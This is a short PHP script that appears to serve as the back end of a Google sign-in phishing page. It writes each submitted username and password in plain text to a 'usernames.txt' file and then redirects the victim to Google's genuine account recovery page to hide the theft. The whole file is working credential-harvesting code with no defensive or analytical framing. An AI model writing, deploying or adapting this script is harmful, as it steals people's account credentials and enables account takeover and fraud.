<?php

file_put_contents("../usernames.txt", "google_new Username: " . $_POST['username'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
?>